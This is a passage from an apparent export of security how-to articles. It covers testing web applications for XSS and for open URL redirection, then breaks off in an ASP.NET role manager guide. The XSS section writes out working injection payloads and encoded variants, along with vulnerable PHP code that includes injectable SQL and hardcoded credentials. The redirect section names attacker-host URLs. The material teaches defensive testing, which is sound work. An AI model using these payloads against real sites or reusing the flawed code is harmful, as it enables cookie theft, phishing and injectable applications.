<em>reflected</em> to the visitor and executes at the visitor's browser.&nbsp;</p><p>A persistent XSS bug is when a script embedded in malicious data is stored in a persistent store such as database, a file, or other storing mechanism.&nbsp; The malicious data containing a script <em>persists</em> in the server.&nbsp;&nbsp; If the server application takes this stored content and sends it to the client without validating its contents, the script will be executed in the browser.&nbsp;</p><p>It is important to understand both XSS attack scenarios to know what to look at when testing.</p><p><strong><em>Reflective XSS through web search form scenario</em></strong></p><p>A web site has a search page named search.php that contains the following form:</p><p><img src="../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image001.png"></p><p>&lt;form&gt;</p><p>&lt;input name="searchInput" type="text" size="50"&gt;</p><p>&lt;input name="searchButton" type="button" size="20" value="search"&gt;</p><p>&lt;/form&gt;</p><p>&nbsp;It collects input using the searchInput variable and shows the results in the same page:</p><p>&nbsp;&lt;p&gt; Search results for &lt;?php echo $_GET['searchInput']?&gt; are:</p><p>&nbsp;The user can type test and will see:</p><p><img src="../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image003.png"></p><p>An attacker can exploit the searchInput variable using the SCRIPT tag and type:</p><p><img src="../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image005.png"></p><p>The server will send the user a page containing a SCRIPT tag and the user browser will execute its contents and display a message box with the word XSS.&nbsp; An attacker can send an email to a victim and tell her to click the following URL:</p><p>http://teammentorexample.com/search/search.php?searchInput=&lt;SCRIPT&gt;payload&lt;/SCRIPT&gt;</p><p>When following the link, the malicious payload executes in the victim browser's context and can be used for stealing session or cookie information.</p><p><strong><em>Persistent XSS through a SQL database server</em></strong></p><p>A web application creates a profile web page by querying a database table and getting profile information from it. The problem is that the database doesn't check for a possible script being stored in the database.&nbsp; To display the user's favorite quote it uses the following PHP code:</p><p>echo 'favorite quote:&nbsp; &lt;br&gt;';</p><p>$connection = odbc_connect("sqldb", "admin", "root");</p><p>$query = "SELECT quote FROM ProfileTable WHERE UserName = " . &nbsp;$_GET['user']"; </p><p>$result = odbc_exec($connection, $query);</p><p>odbc_fetch_row($result);</p><p>$quote = odbc_result($result, 1); </p><p>print($quote);</p><p>An attacker with a profile name of 'JohnB' connected to the database before and set this information in his profile as his favorite quote:</p><p>&lt;SCRIPT&gt;alert('XSS') &lt;/SCRIPT&gt;</p><p>Now, every time that anyone visits the their profile by following a link like this one will see the alert box:</p><p>&nbsp;http://teammentorexample.com/showProfile.php?user=JohnB</p><p>The attacker can modify the alert box with a more dangerous payload such as stealing session or cookie information.</p><p><strong>Step 2: List High Risk Components and Entry Points</strong></p><p><strong><em>Identify high risk components</em></strong></p><p>The next step in testing for XSS bugs is to do an extensive and careful revision of components that take input data from Internet clients and use send it back to the client.&nbsp; In case of large web services, documentation such as design or architectural, if available, become real handy at this point. &nbsp;&nbsp;Testers need to think about what components reflect data to a web client (for reflective XSS) and store data which is later send to a web client (for persistent XSS).&nbsp; Common components that do this include:&nbsp;</p><p>Search web pages</p><p>Profile-related web pages</p><p>Web forums</p><p>Blogs</p><p>RSS feeds</p><p>HTML-based help browsers for thick clients&nbsp;</p><p><strong><em>Look for code that writes HTML responses</em></strong></p><p>There are many different scripting functions that append HTML to the server response.&nbsp; Finding the server-side code that writes data out is the first step evaluating and finding potential XSS issues.&nbsp; Here are some examples of functions that do that:</p><p>Response.Write&nbsp;&nbsp;&nbsp; (ASP)</p><p>&lt;%= %&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (ASP)</p><p>echo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (PHP)</p><p>print&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (PHP)</p><p>Functions to write data to a response vary depending on the language and platform you're testing.&nbsp; Be certain that you understand all the relevant functions in the language you're using.</p><p><strong><em>Check for non-validated and unencoded data in responses</em></strong></p><p>Next, check what is being output by the mechanisms above.&nbsp; For example, an application might do this:</p><p>Response.Write(Request.QueryString(search))</p><p>To write the contents of the search value in the URL.&nbsp; If the variable is set to a script it will execute as soon as the client renders the page written.</p><p>The following PHP code doesn't look so harmful at first.&nbsp; </p><p>print($quote);</p><p>However, if the quote variable is a string that directly comes from a database like in the persistent scenario above then it suffers of XSS.</p><p>Look carefully at cases where the output data comes from a back-end though a database or a web method.&nbsp; It might be that a web method returns non-validated data:</p><p>Response.Write(ExternalApplication.GetRSSFeedMethod())</p><p>Even if the data written out by an application comes directly from the user and has not been specifically validated for format, if it is appropriately encoded, it can still be safe.&nbsp; That said, the encoding must take the form of a whitelist of known-safe characters (generally only the alphanumerics), not a blacklist as is commonly attempted.</p><p><strong><em>Match high risk components with entry points</em></strong></p><p>Non-validated data comes from all of the application's entry points, not just the web.&nbsp; Be certain to cover all the possible sources of malicious data which might get passed to a client.&nbsp; Common data sources include:</p><ul><li>Web forms</li><li>URL contents</li><li>Cookie contents</li><li>Flash parameters</li><li>SQL database query contents</li><li>Web service data</li><li>Graphical User Interface</li></ul><p>List the high risk variables in the application and their data sources to make sure that they are covered during review and testing&nbsp;&nbsp;</p><p><img src="../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image007.png"></p><p><strong>Step 3:&nbsp; Start Test and Exploring&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </strong></p><p>During this step testing is focused at submitting basic XSS fuzz strings and observing how the application reacts, and then trying to display a simple alert box that proves the existence of an XSS bug.</p><p><strong><em>Start with a simple fuzz string</em></strong></p><p>Success in finding XSS bugs depends on whether the tester is able to store or reflect an HTML script in or through the server.&nbsp; In almost all cases scripts are included in between SCRIPT tags (other tags also worked as explained later).&nbsp; During this step, it is recommended to start exploring how the server application's high risk components react to tag related input.&nbsp; A good idea is to start testing a simple fuzz string like this one:</p><p>'&gt;;!--"&gt;&lt;XYZ&gt;&lt;=&amp;{()}</p><p>Then look for the string XYZ in server's response to see how the server processed the special script related characters.&nbsp; It might turn out that the server uses the string inside of a tag:</p><p>&lt;<strong>input</strong> type="text" name="keyword" id="keyword" maxlength="255" value=<a name="line163"></a>"'&gt;;!--"&gt;&lt;<strong>XYZ</strong>&gt;&lt;=&amp;{()}" style="height:10px; color:#000;" /&gt;</p><p>Continue by modifying the initial string to try displaying an alert.&nbsp; The double quotes of the original fuzz string closed the <em>value</em> property so whatever came before doesn't matter.&nbsp; Also, after the closing parenthesis next to the letter Z the string can be anything.&nbsp; Taking the string can be simplified to this:</p><p>"&gt;&lt;XYZ&gt;</p><p>The server might reply with:</p><p>&lt;<strong>input</strong> type="text" name="keyword" id="keyword" maxlength="255" value=<a name="line1631"></a>""&gt;&lt;<strong>XYZ</strong>&gt;" style="height:10px; color:#000;" /&gt;</p><p>To learn more,&nbsp;see the XSS Cheat Sheet at&nbsp;Ha.ckers.com (<a href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a>)</p><p><strong><em>Try to display an alert box</em></strong></p><p>The following goal is to execute a script and the easiest script to test is the one shown in the first scenario that displays an alert box.&nbsp; Note that now the tester knows that the malicious sting needs to start with the "&gt; character, due to where in the HTML document it will appear:</p><p>"&gt;&lt;script&gt;alert('Works')&lt;/script&gt;</p><p>If the server doesn't filter the SCRIPT tags then an alert box will appear.&nbsp; The code sent back to the tester will look like this.</p><p>&lt;<strong>input</strong> type="text" name="keyword" id="keyword" maxlength="255" value=<a name="line16311"></a>""&gt;<span style="text-decoration:underline">&lt;script&gt;alert('Works')&lt;/script&gt;</span>" style="height:10px; color:#000;" /&gt;</p><p><strong><em>Cover different tags</em></strong></p><p>Sometimes severs filter out the string &lt;script&gt; from their output.&nbsp; If the server doesn't allow script tags, try the img tag and put your code in the src property:</p><p>"&gt;&lt;img src="javascript:alert('Works');"&lt;/img&gt;</p><p>In fact, there are many other tags known to be dangerous in some cases, such as &lt;iframe&gt;, &lt;body&gt;, &lt;embed&gt;, &lt;meta&gt;, &lt;html&gt;, &lt;frame&gt;, &lt;frameset&gt;, &lt;input&gt;, &lt;layer&gt;, &lt;object&gt;, and &lt;style&gt;. </p><p>A good choice is to try the following that doesn't require script tags or the JavaScript command:</p><p>"&gt;&lt;body onload=alert('Works')&gt;</p><p><strong>Step 4:&nbsp; Tune Test Case Data&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </strong></p><p>During this step testing is focused at covering all entry points and tuning test case data based on the format of the specific entry point.&nbsp;&nbsp; </p><p><strong><em>Consider string format and encoding according to entry point</em></strong></p><p>The example in step 3 doesn't specify how the fuzz string was passed to the application (it can be assumed that it was through a web form for these purposes). &nbsp;During this step, testers need to go through their list of components and entry points and modify test case data according to the entry point.&nbsp; Make sure that all entry points are covered.</p><p><strong><em>Web Forms</em></strong></p><p>Web forms are the easiest to test since they commonly allow only ASCII strings.&nbsp; To test through this entry point, just go through the high risk component list looking for ones that have web forms.&nbsp; Then use a web browser to submit test strings to the components via the forms, and possibly an attack proxy like Burp Suite to circumvent any client-side JavaScript used for data validation.</p><p><strong><em>URL Contents</em></strong></p><p>A web application is vulnerable to XSS through the value passed in the password variable:&nbsp;</p><p>http://www.xvulnerablesite.com/login.asp?username=[value]&amp;password=[value]</p><p>If testers want to test the following string in the password value:&nbsp;</p><p>&lt;script&gt;alert('Works')&lt;/script&gt;</p><p>They will need to modify the above URL in this way:</p><p>http://www.xvulnerablesite.com/login.asp?username=any&amp;password=&lt;script&gt;alert('Works')&lt;/script&gt;</p><p>When executing test cases through the URL it is important to try different encodings of the test string.&nbsp;&nbsp; For instance, one can execute the first attack string below and it causes no effect.&nbsp; Then execute the second one and the alert box works.&nbsp; In this case the web application didn't allow the symbol characters (except the round brackets) in ASCII but did in their hexadecimal encodings:&nbsp;</p><p>&lt;img src="javascript:alert('Works');"&gt;</p><p>&nbsp;http://www.xvulnerablesite.com/login.asp?username=any&amp;password=&lt;img%20src%3d%22javascript:alert(%27Works%27)%22&gt;</p><p>When testing through the URL and sometimes in other places, it is necessary to investigate what type of encodings the server is using and modify test cases according to them.</p><p><strong><em>Cookie contents</em></strong></p><p>Sometimes the application blindly displays the contents of a cookie in the web browser such as showed in the following PHP code:</p><p>&lt;?php&nbsp; echo $_COOKIE["testcookie"]; ?&gt;</p><p>To test the risky component through this entry point we have to modify the cookie file in disk and try to inject a simple script:</p><p><img src="../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image009.png"></p><p>Then restart the browser and navigate to the page containing the PHP code to see if an alert box appears.&nbsp; Alternately, an attack proxy can be used to perform this modification on the fly, which is especially helpful in the case of complicated applications.</p><p><strong><em>Flash Parameters</em></strong></p><p>Since Flash parameters are frequently passed in the URL, testing Flash parameters is similar to testing URL contents.&nbsp; Here, it is necessary to go through each parameter in the URL and see how the application reacts.&nbsp; Flash also frequently receives parameters using <strong>FlashVars</strong>.&nbsp; Consider the following code to load a Flash movie:</p><p>&nbsp;&lt;object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"</p><p>&nbsp;codebase=""http://macromedia.com/cabs/swflash.cab#version=6,0,0,0""</p><p>&nbsp;width="250" height="250" id="flaMovie1" align="center"&gt;</p><p>&nbsp;&lt;param name=movie value="flaMovie1.swf"&gt;</p><p>&nbsp;&lt;param name=<strong>FlashVars</strong> value=<strong>"inputURL=usersinput"</strong>&gt; </p><p>&nbsp;&lt;param name=quality value=high&gt; </p><p>&nbsp;&lt;param name=bgcolor value=#ffffff&gt; </p><p>&nbsp;&lt;embed src="flaMovie1.swf" <strong>FlashVars</strong>=<strong>"inputURL=usersinput"</strong> </p><p>&nbsp; quality="high" bgcolor="#ffffff" width="250" height="250" </p><p>&nbsp; name="flaMovie1" align type="application/x-shockwave-flash" </p><p>&nbsp; pluginspage="http://www.macromedia.com/go/getflashplayer"&gt;</p><p>&lt;/object&gt;</p><p>&nbsp;During this step, testers will need to change the entry parameters to Flash like this:</p><p>&nbsp;&lt;object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"</p><p>&nbsp;codebase=""http://macromedia.com/cabs/swflash.cab#version=6,0,0,0""</p><p>&nbsp;width="250" height="250" id="flaMovie1" align="CENTER"&gt;</p><p>&nbsp;&lt;param name=movie value="flaMovie1.swf"&gt;</p><p>&nbsp;&lt;param name=<strong>FlashVars</strong> value=<strong>"inputURL=%3cscript%3ealart%28%b4XSS%b4%29%3c%2fscript%3e"</strong>&gt; </p><p>&nbsp;&lt;param name=quality value=high&gt; </p><p>&nbsp;&lt;para name=bgcolor value=#ffffff&gt; </p><p>&nbsp;&lt;embed src="flaMovie1.swf" <strong>FlashVars</strong>=<strong>"inputURL=%3CSCRIPT%3Ealert%28%B4XSS%B4%29%3C%2FSCRIPT%3E"</strong> </p><p>&nbsp; quality="high" bgcolor="#ffffff" width="250" height="250" </p><p>&nbsp; name="flaMovie1" align type="application/x-shockwave-flash" </p><p>&nbsp; pluginspage="http://www.macromedia.com/go/getflashplayer"&gt;</p><p>&lt;/object&gt;</p><p><strong><em>Graphical User Interface</em></strong></p><p>Testing through the UI is similar to web form testing in that the tester enters test values&nbsp; directly to the screen.&nbsp; In the case of GUI testing the application used is not a web browser but any other application that interacts with high risk components, renders HTML,&nbsp; and that allows user input or otherwise receives untrusted data.<strong></strong></p><p><strong><em>Look for additional entry points</em></strong></p><p>Each application has its own set of entry points.&nbsp; This article lists the common ones for XSS attacks.&nbsp; Nonetheless, testers must explore their application for additional ways of passing data that might make it into a XSS vulnerability.&nbsp; It is recommended to use system monitoring tools such as the ones from www.sysinternals.com and dedicated attack tools such as Burp proxy that lets you intercept and add match-and-replace rules to change the contents of HTTP packets.</p><p><strong><em>Keep tuning test cases </em></strong></p><p>Sometimes the initial test string can land in a part of the source code where XSS is possible without using a script tag.&nbsp; The tester may be able to pad it a little or maybe just write the JavaScript command.&nbsp; Always check if the initial input lands inside or within an actual command or parameter.</p><p>Tags have different ways of modifying them for script injection.&nbsp; To learn more about testing web applications for Cross-Site Scripting Vulnerabilities, see <a href="http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx">http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx</a>&nbsp;and&nbsp; <a href="http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors">http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors</a>.</p><p><strong><em>Consider the case of persistent XSS</em></strong></p><p>Sometimes the tester won't see the results of test cases right away.&nbsp; An XSS bug might exist that takes malicious input and only sends it back if the attacker does something else like visiting another page, for instance.&nbsp; Such is often the case with a persistent XSS attack.</p><p>Consider the following case.&nbsp; An application asks for a user's password hint.&nbsp; When the server prompts the user for the hint, the attacker types one of the XSS test strings described before.&nbsp; Then submits the registration but the server doesn't show the alert box.&nbsp; Then the attacker has the victim browse the site's password page and ask for the hint.&nbsp; When the site displays the hint the alert box appears.&nbsp; </p><p>While testing persistent XSS, testers must think of all the places where the input might end up and check all of them.&nbsp; They should talk to developers and use specifications to check all data stores where a persistent XSS bug can manifest.</p><p><strong><em>Automating test cases</em></strong></p><p>One can automate XSS testing by setting up a server that collects any successful XSS attacks.&nbsp; For instance, can create an ASP page that has the following code, and name the page results.asp</p><p>&lt;%<br>&nbsp;&nbsp; set fso = Server.CreateObject("Scripting.FileSystemObject")<br>&nbsp;&nbsp; set fw = fso.CreateTextFile("c:\inetpub\wwwroot\results.txt",True)<br>&nbsp;&nbsp; fw.WriteLine("test case:")<br>&nbsp;&nbsp; fw.WriteLine(Request.QueryString("testcase"))&nbsp;&nbsp; <br>&nbsp;&nbsp; fw.Close <br>%&gt;</p><p>&nbsp;Then generate test cases by modifying or creating new HTTP requests to the target server.&nbsp; Instead of displaying alert the script invokes results.asp passing its corresponding test case number (using the src property of HTML tags).&nbsp; For example the tester wants to cover XSS through the img tag in the password field of the login page.&nbsp; He labels this test case number 17.&nbsp; Then passes the following string using automation:</p><p>http://www.xvulnerablesite.com/login.asp?username=any&amp;password=&lt;img src="http://xyoursite.com/results.asp?testcase=17"&gt;</p><p>&nbsp;If this test case fails then the value 17 appears in the results.txt file and the tester knows that a XSS bug was found and what caused it.&nbsp; Testers can code hundreds of test cases like this and a test generator like an HTTP client to guide the automation.&nbsp;</p><p>In addition, look at the different fuzzers available for free at <a href="http://en.wikipedia.org/wiki/Fuzz_testing">http://en.wikipedia.org/wiki/Fuzz_testing</a>.&nbsp; Many of these have the capability of executing XSS test cases and help in uncovering vulnerabilities.</p><h1>Conclusions</h1><p>Testing for XSS bugs is not complicated but you need to be thorough.&nbsp; It is important that you go through all the places where your web server renders HTML output.&nbsp; There are many strings to try, many tags to look at, different methods to feed the test data, and even room for automation.&nbsp; However, the most important thing to keep in mind is to follow your test data.&nbsp; Don't just look for the alert box, but look at the code that comes back to you.&nbsp; Successful XSS testing is all about knowing how to tune you test case data.</p><h1>Additional Resources&nbsp;</h1><ul><li>XSS (Cross Site Scripting) Cheat Sheet.&nbsp; Ha.ckers.com (<a href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a>)</li><li>Testing Your Web Applications for Cross-Site Scripting Vulnerabilities, Chris Weber. <a href="http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx">http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx</a>&nbsp;</li><li>OWASP Testing Guide Appendix C: Fuzz Vectors. <a href="http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors">http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors</a></li><li>&nbsp;Fuzz Testing.&nbsp; Wikipedia. <a href="http://en.wikipedia.org/wiki/Fuzz_testing">http://en.wikipedia.org/wiki/Fuzz_testing</a>&nbsp;</li></ul><h1>Related Items</h1><div><ul><li><div>&nbsp;<a href="ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E">Attack: Cross Site Scripting Attack</a></div></li></ul></div>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1708386116" Content_Hash="-582698246">
    <Metadata>
      <Id>99702f34-065f-443d-812e-7b13a12d647a</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Test for URL Redirection Bugs</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Test</Phase>
      <Technology> Any</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><p><strong></strong></p><ul><li>Web Applications</li></ul><p><strong></strong></p><h1>Summary</h1><p>Web applications use URL redirection to redirect their web clients to another URL address, most commonly in another domain. In most cases, applications hide URL redirection from their clients, such as when using a redirect page. However, sometimes applications expose URL redirecting to their clients such as when using a URL parameter to specify the target URL location. URL redirection attacks consist of exploiting URL redirection done through URL parameters for malicious purposes. To execute this attack, an attacker creates a malicious link that attempts to redirect towards a malicious site any web client who follows it. </p><p>Follow these steps to test for URL redirection bugs:</p><br><ul><li>Step 1: Understand attack scenarios </li><li>Step 2: Analyze causes and countermeasures </li><li>Step 3: Start testing and exploring </li><li>Step 4: Fine-tune test case data</li></ul><br><br><h1>Step 1: Understand Attack Scenarios</h1><br><p>First, it is necessary to understand the anatomy of URL redirection bugs. During a URL redirection attack the attacker’s main goal is to redirect a target web client to a malicious site. This is achieved by sending a link to the web client that starts with the application domain name but contains a URL parameter. When the client clicks the link, the client’s browser is first directed to the vulnerable application which in turn redirects the client to the malicious location indicated by the URL parameter. For the attack to succeed two conditions must be met: first, an attacker must find a vulnerable application that redirects its clients to a location indicated by a URL parameter, and, second, the target web client must click on the malicious link. </p><p>In detail:</p><br><ol><li>The attacker finds a URL in the target web application that redirects web clients to a page dictated by a URL parameter (or through a special control character such as a question mark or asterisk). </li><li>The attacker sends a link to a target web client with the legitimate URL (found in step 1), but the attacker modifies the destination page to one of the attacker’s choice. </li><li>The target client clicks on the malicious link. This causes the target client’s web browser to be redirected to the malicious page set by the attacker.</li></ol><br><h1>Step 2: Analyze Causes and Countermeasures</h1><br><p>Next, you must understand what causes URL redirection bugs and how to defend against them. This will help you identify this issue in source code and prepare to execute the test cases.</p>
<p>Web applications use URL redirection for different purposes. For instance, an application that has a page moved to a different location uses a redirect to send its clients to the new page location. To achieve this automatically the application can use code that invokes methods such as <em>response.redirect</em> in PHP applications and internally control the redirection. However, some applications expose the URL redirection logic to outside clients. For instance, an application might use a redirect page that takes a URL parameter as the redirect target location. Consider the following URL: </p><pre>http://example.com/navigate.php?redir=<strong>http://example.com/login.php</strong></pre><br><p>The web application uses the <em>redir </em>URL parameter to control the target redirect location. An attacker can leverage this fact to trick a web client who trusts <em>example.com</em> into clicking the following link: </p><pre>http://example.com/navigate.php?redir=<strong>http://attackers.com/gotcha.php</strong></pre><br><p>If the application is vulnerable it redirects the client who clicks the link above to the attacker’s domain. Note that the attack is possible because the application exposes the URL redirection logic to web clients through the URL and because it doesn’t check the contents of the redirection target before doing the actual redirect, allowing the target to be modified towards a malicious website. </p>
<p>To defend against this bug developers such hide any URL redirection control from outside clients. If they must expose URL redirection through URL parameters, then applications must properly validate any redirect target before performing the redirect. Developers should implement a white list containing all the allowed redirect target locations and add relevant code to the application that disallows redirects to any location that is not in the white list. </p><p>Another option to protect against this attack is to warn clients that they will be redirected to an arbitrary location and give them the option not to do so. This is the technique currently used by Yahoo to countermeasure URL redirection attacks [i]. When clicking the link below the browser is directed to a Yahoo page that warns clients that they can navigate to the destination at their own risk:</p>
<p><a href="http://us.ard.yahoo.com/*http://google.com">http://us.ard.yahoo.com/*http://google.com</a></p><br><br><h1>Step 3: Start Testing and Exploring</h1><p>Now that you’ve reviewed the theoretical aspects of URL redirection attacks you should follow the next test case to check for it in your application. </p><h2><em>Test for URL redirection </em></h2><p>Follow these steps to test for URL redirection:</p><ol><li><p>Discover an application’s page/request that executes URL redirection. Note down the URL that is used during the redirection request. It is suggested to analyze the application’s use of URLs to find any embedded URLs; any URL contained within another URL is a hint of URL redirection. </p></li><li><p>Once you’ve found a suspicious URL, discover what part of this URL the application uses to pass the target redirect location. The application can pass the target URL in a named URL parameter: </p><pre>http://domain/navigate.php?redir=http://example.com/login.php </pre><p>Or by appending it after a special character such as a question mark or an asterisk (another symbols may be used)</p><pre>http://domain/navigate.php?http://example.com/login.php </pre></li><li><p>Modify the target redirect URL to a different URL such as (www.google.com) and make the request using a web browser:</p><pre>http://domain/navigate.php?http://www.google.com</pre></li></ol><p>Expected results: The application is vulnerable to URL redirection attacks if it redirects the web browser to the target URL modified in step 3 without giving any warnings. </p><br><br><h1>Step 4: Fine-tune Test Case Data</h1><br><p>URL redirection attacks require the target client to click on a malicious link. However, Internet clients might feel uneasy&nbsp;clicking a link if they notice that part of the link is not a trusted one. Therefore, an application that allows an attacker to pad or obfuscate the target URL has an increased the risk of a URL redirection attack on Internet clients. Consider the following URL links:</p>
<pre><a href="http://trusted_domain/nav.php?redir=http://attacker.com/run.php">http://trusted_domain/nav.php?redir=http://attacker.com/run.php</a> </pre><pre><a href="http://trusted_domain/nav.php?redir=http://64.214.88.103/run.php">http://trusted_domain/nav.php?redir=http://64.214.88.103/run.php</a></pre><p>Note that this list is not exhaustive and it is necessary to keep up to date with different URL padding/masquerading methods.</p><p>The first URL can be quite suspicious to clients if they see it in the browser’s status bar. The third URL is obfuscated by using the attacker’s domain IP address instead of the domain name. The last URL is less suspicious than the first one and increases the exploitability of URL redirection bugs. </p><br><br><h1>Conclusions </h1><p>Attackers use URL redirection attacks to trick web clients into visiting a malicious site for phishing or spoofing purposes or to redirect a target client to a page containing malware that automatically attempts to infect the client’s computer. Even though URL redirection is a valid and convenient method for redirecting web clients to legitimate locations, such as when a web page is moved or deleted or when a site changes domain names; it is dangerous when the application exposes URL redirection to web clients and allows redirection to an arbitrary domain. To test for this vulnerability you must find a request that does a redirect based on the URL and modify the URL using the methods suggested. Finally, you must fine-tune the test cases using URL padding and obfuscation to increase the exploitability of this bug. </p><br><hr><br><p>[i] <strong>URL Redirection Attack with Examples</strong>. Paralliverse. <a href="http://log0.wordpress.com/2008/06/23/url-redirection-attack-with-examples/">http://log0.wordpress.com/2008/06/23/url-redirection-attack-with-examples/</a></p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1355003207" Content_Hash="-441246089">
    <Metadata>
      <Id>a2511b7b-71ce-4d38-b4d5-5f877aaeb13d</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Use Role Manager in ASP.NET</Title>
      <Category>Role Manager Settings</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Microsoft Windows Server 2003 operating system or later&nbsp;operating system</li><li>Microsoft Windows XP Professional Service Pack 1 or later operating system </li></ul><h1>Summary</h1><p>This How to shows you how to use the ASP.NET role manager. The role manager eases the task of managing roles and performing role-based authorization in your application. It shows how to configure the various role providers for use with your Web application, how to create new roles, how to add a user to a role, and how to use the role management API for roles-based authorization.</p><h1>Contents</h1><ul><li><div>Objectives</div></li><li><div>Overview</div></li><li><div>Summary of Steps</div></li><li><div>Step 1. Configure Your Role Store</div></li><li><div>Step 2. Configure Your Role Provider in Web.config</div></li><li><div>Step 3. Create and Assign Roles</div></li><li><div>Step 4. Perform Role-Based Authorization</div></li><li><div>Additional Considerations</div></li><li><div>Additional Resources</div></li></ul><h1>Objectives</h1><ul><li>Configure an ASP.NET Web application to use role management. </li><li>Learn how to configure the <strong>SqlRoleProvider</strong>, <strong>WindowsTokenRoleProvider</strong>, and <strong>AuthorizationStoreRoleProvider</strong>. </li><li>Create and assign roles by using ASP.NET configuration tools, SQL scripts, and the role management APIs. </li><li>Perform role based authorization in an ASP.NET Web application. </li></ul><h1>Overview</h1><p>ASP.NET&nbsp;includes a role manager feature that includes a roles management API that allows you to create and delete roles and assign and remove users from roles. The role manager stores its data in an underlying data store that it accesses through an appropriate role provider for that data store.</p><p>The main benefits of using role manager are that it allows you to look up users' roles without writing and maintaining code. Additionally, the role providers offer a consistent way for you to check the role membership of your users, regardless of the underlying data store. Therefore, if your role store were to change tomorrow, you would only need to change the configuration settings to make your code work.</p><p>Supplied role providers include: </p><ul><li><strong>SqlRoleProvider.</strong> This is used where the role store is kept in SQL Server. </li><li><strong>WindowsTokenRoleProvider.</strong> This is a read-only provider that retrieves role information for a Windows user account based on the account's Windows security group membership. You cannot create, add to, or delete roles with this provider. </li><li><strong>AuthorizationStoreRoleProvider.</strong> This is used if your application uses Authorization Manager (AzMan). It uses an AzMan policy store in an XML file, in Active Directory, or in Active Directory Application Mode (ADAM) as its role store. It is typically used in an intranet or extranet scenario where Windows authentication and Active Directory is used for authentication. </li></ul><p>To perform role management, your ASP.NET application must be able to identify and authenticate its users in some way. For example, it might use Windows authentication or Forms authentication.</p><p>This How to shows you how to set up and configure a role store and a role provider and use role-based authorization in your ASP.NET applications. Additionally, it demonstrates some of the basic roles API calls available to work with roles programmatically.</p><h1>Summary of Steps</h1><p>To use the role manager in your application, perform the following steps: </p><ul><li>Step 1. Configure your role store. </li><li>Step 2. Configure your role provider in Web.config. </li><li>Step 3. Create and assign roles. </li><li>Step 4. Perform role-based authorization. </li></ul><h1>Step 1. Configure Your Role Store </h1><p>In this step, you prepare the role store used to maintain role details. The setup details vary according to the store and associated provider that you choose to use.</p><h2>Using SqlRoleProvider</h2><p>If you want to store roles in SQL Server, you use the <strong>SqlRoleProvider</strong>. By default, roles are stored in a database named Aspnetdb in a SQL Express database instance in the \app_data folder beneath your application's virtual directory root folder. You can also configure the <strong>SqlRoleProvider</strong> to use a local or remote instance of SQL Server.</p><h3>To use a SQL Express database role store in the Website \app_data folder</h3><p>You do not have to create or configure this database. The first time you perform an operation that uses the role management API, ASP.NET automatically creates a database named Aspnetdb, configures it, and sets appropriate permissions on it. </p><p>ASP.NET configures the SQL Express database with a database login for the default accounts used to run ASP.NET applications (Network Service on Windows Server 2003 or later&nbsp;and ASPNET on Windows 2000) and grants them full access to the Aspnetdb database. </p><p>If you have configured ASP.NET to run using a custom service account, you must create a SQL login for that account, and add the login to the <strong>aspnet_Roles_FullAccess</strong> role in the Aspnetdb database. </p><p><strong>To install the role management database in SQL Server</strong> </p><ol><li>Log on to Windows using an account that has administration rights for your SQL Server instance. </li><li>Open a command prompt window and execute the following command to install the role management database. <p><strong>Aspnet_regsql.exe</strong>-<strong>E</strong>-<strong>S</strong> 